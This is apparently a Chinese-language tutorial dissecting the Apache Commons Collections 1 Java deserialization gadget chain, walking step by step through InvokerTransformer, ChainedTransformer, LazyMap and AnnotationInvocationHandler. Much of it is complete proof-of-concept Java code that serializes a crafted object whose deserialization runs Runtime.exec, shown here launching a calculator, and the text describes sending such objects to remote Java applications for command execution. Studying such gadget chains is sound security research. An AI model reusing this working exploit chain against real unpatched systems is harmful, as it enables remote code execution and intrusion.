    CommonsCollections1

    版本要求：

    • DK版本：1.7 （8u71之后已修复不可利用）
    • CommonsCollections 3.1 - 3.2.1

    具备知识：

    • 反射
    • 动态代理

    0x02 后半条链进行分析：

    这里先对后半条链进行分析，然后使用反推思想再去分析为什么需要前半条链

    在commons collections中有一个Transformer接口，其中包含一个transform方法，通过实现此接口来达到类型转换的目的。

    接口没办法直接调用，我们需要去找它的实现类，cc1中主要利用了以下三个

    • InvokerTransformer：其transform方法实现了通过反射来调用某方法

    • ConstantTransformer：其transform方法将输入原封不动的返回

    • ChainedTransformer：其transform方法实现了对每个传入的transformer都调用其transform方法，并将结果作为下一次的输入传递进去

    所以demo可以这样编写

    第一个疑问：为啥要用三个类组成链去实现Runtime方法

    是因为Runtime没有继承Serializable，所以不可以在客户端被序列化到本地,也就没法进行后续的反序列化操作了，这里需要使用反射调用，而这里逻辑思路是:

    ConstantTransformer会将Runtime.class传给 –>

    第一个InvokerTransformer() 是调用getMethod方法获取了getRuntime这个Method对象–>

    第二个InvokerTransformer() 通过Invoke获取getRuntime的执行结果–>

    第三个InvokerTransformer()。而它们为什么会一直传下去，是因为ChainedTransformer的作用。

    疑问

    小知识点：

    invoke

    1. invoke调用普通方法时，传入的必须是实例化后的类
    2. invoke调用静态方法时，传入类即可

    第一个疑问：为啥不使用InvokerTransformer+反射获取获取Runtime对象，造成RCE呢，下面有Demo代码，可以看到可以弹计算器。

    InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
Object obj = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));
invokerTransformer.transform(obj);

    原因是：Runtime没有继承Serializable，所以不可以在客户端被序列化到本地,也就没法进行后续的反序列化操作了，这里需要通过一个可以反序列化类使用反射调用

    第二个疑问：这样写不可以吗

          Transformer[] transformers = new Transformer[]{
               new ConstantTransformer(Runtime.getRuntime()),
               new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
      };
       ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
       chainedTransformer.transform(111);

    首先创建Transformer[] 数组,然后将ConstantTransformer 和 InvokerTransformer 作为元素传入,Runtime.getRuntime() 会返回一个Runtime对象，然后利用ConstantTransformer的transform方法直接返回，作为输入传递给InvokerTransformer，利用反射调用Runtime对象中的exec方法进行命令执行,将前面的Transformer数组传入ChainedTransformer，并且调用transform。

    ps：由于ConstantTransformer类中的transform方法的输入并不会影响输出，所以chainedTransformer.transform(111);可以传入入任意数值

    原因：

    打断点发现，我们传入的为java.lang.Runtime 但是在经过 input.getClass之后返回的是 java.lang.Class，所以导致出现了之前的报错

    getClass() ：获取运行对象的类

    查看对应的资料发现 getClass()根据传入参数的不同返回数据也会有不同

    1. 如果传入的是对象， 那么返回的就是当前对象的类
    2. 如果传入的是类，那么返回的就是 java.lang.Class

    结论：

    上面我们已经知道了在经过 Class cls = input.getClass(); 之后返回的只会是java.lang.Class，那么我们可以利用Class中的getMethod来获取Runtime中的getRuntime方法，然后再利用反射中调用invoke进行执行，从而返回Runtime实例

    最终的POC

    ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
        new ConstantTransformer(Runtime.class), 
        // 返回 java.lang.Runtime,但我们知道Runtime.class经过getClass()，之后返回的只会是java.lang.Class
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),  
        //利用Runtime.class中的getMethod 获取getRuntime，这样我们就能得到一个Runtime实例
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),      
        // 上面返回的应该是getRuntime的这个静态方法 获取反射类中的invoke类执行getRuntime
        new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"calc"})});
        //MAC"calc"换成"open -a Calculator" , 调用返回实例中的exec

    到这里后半段的链分析完了，而我们的目的是在调用readObject的时候就触发rce，也就是说我们现在需要找到一个点调用了transform方法（如果能找到在readObject后就调用那是最好的），如果找不到在readObject里调用transform方法，那么就需要找到一条链，在readObject触发起点，接着一步步调用到了transform方法。

    我们找到Lazymap#get这个方法中调用了transform，但是我们怎么去调用Lazymap#get这个方法呢，所以我们就有了前半条链，拼接前半条链+Lazymap#get+后半条链

    这里的是this.factory可控的，我们可以通过创建LazyMap实例的方式来设置他的值

    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {
          ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[] {
                          String.class, Class[].class }, new Object[] {
                          "getRuntime", new Class[0] }),
                  new InvokerTransformer("invoke", new Class[] {
                          Object.class, Object[].class }, new Object[] {
                          null, new Object[0] }),
                  new InvokerTransformer("exec",
                          new Class[] { String.class }, new Object[]{"calc"})});
          HashMap innermap = new HashMap();
          Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
         
          Constructor[] constructors = clazz.getDeclaredConstructors();
          Constructor constructor = constructors[0];
          constructor.setAccessible(true);
          LazyMap map = (LazyMap)constructor.newInstance(innermap,chain);
          map.get(123);
     }

    PS：这里使用反射，因为Lazy构造方法中，是protected，而不是product，所以需要用反射来调用

    0x03前半部链进行分析：

    目的：寻找重写了readObject()并调用MapEntry类的get方法

    如果Java应用没有对传入的序列化数据进行安全性检查，可以将恶意的TransformedMap序列化后，远程提交给Java应用，如果Java应用可以触发变换，即可成功远程命令执行。结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中调用MapEntry类的get方法，并且这个Map变量是可控的，就可以远程命令执行。于是找到了这个类：AnnotationInvocationHandler

    前半部链AnnotationInvocationHandler，用于触发LazyMap的get方法。AnnotationInvocationHandler是一个代理类，并且可以序列化，且实现了readObject，所以但我们服务端存在可控的readObject的时候，我们使用AnnotationInvocationHandler这条链，服务端会使用AnnotationInvocationHandler的重写readObject，触发后续的RCE。

    这里的readObject又调用了this.memberValues的entrySet方法。如果这里的memberValues是个代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler

    如果var4是我们的被代理类map。这里对this.memberValues调用了get方法，就是调用被代理类map的get方法，那么就会触发LazyMap#get，从而完成触发rce。

    最终代码：

    public class cc1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {

        //反序列化利用后半条链
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class), // 返回 java.lang.Runtime,但我们知道Runtime.class经过getClass()，之后返回的只会是java.lang.Class
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),  //利用Runtime.class中的getMethod 获取getRuntime，这样我们就能得到一个Runtime实例
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),      // 上面返回的应该是getRuntime的这个静态方法 获取反射类中的invoke类执行getRuntime
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"calc"})});//MAC"calc"换成"open -a Calculator"  // 调用返回实例中的exec

        HashMap innermap = new HashMap();
        Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap"); //创建LazyMap的Class
        Constructor[] constructors = clazz.getDeclaredConstructors();    //调用LazyMap的空参构造器
        Constructor constructor = constructors[0];
        constructor.setAccessible(true);
        Map map = (Map)constructor.newInstance(innermap,chain);            //使用构造器创建对象，传入数组，和调用链，这里触发调用链的RCE

        //反序列化利用前半条链
        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);//反射创建AnnotationInvocationHandler的Class，并调用带参构造器
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); /

        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象


        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);//使用构造器创建对象，传入proxy_map



        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc1"));
            outputStream.writeObject(handler);//序列化handle到cc1文件中
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc1"));
            inputStream.readObject(); //恢复对象，反序列化使用readObject获取对象，这里调用了AnnotationInvocationHandler被重写的readObject
        }catch(Exception e){
            e.printStackTrace();
        }

    }
}

    疑问：为什么创建AnnotationInvocationHandler实例时传入的第一个参数是Override.class?

    因为传入第一个参数调用了isAnnotation判断是否是注解类，并且这里的注解类需要使用java自带的
